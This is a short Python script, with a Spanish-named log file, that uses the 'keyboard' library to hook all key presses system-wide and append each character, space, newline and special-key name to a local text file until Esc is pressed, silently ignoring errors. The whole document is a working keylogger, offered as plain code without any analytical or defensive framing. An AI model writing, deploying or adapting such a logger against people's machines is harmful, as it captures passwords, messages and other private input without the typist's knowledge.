import keyboard

LOG_FILE = "captura de teclado.txt"

def on_key_press(event):

    with open(LOG_FILE, "a", encoding="utf-8") as f:

        if len(event.name) == 1:
            f.write(event.name)
        elif event.name == "space":
            f.write(" ")
        elif event.name == "enter":
            f.write("\n")
        else:
            f.write(f"[{event.name}]")

def main():
    try:
        keyboard.on_press(on_key_press)
        keyboard.wait('esc')
    except Exception:
        pass

if __name__ == "__main__":
    main()
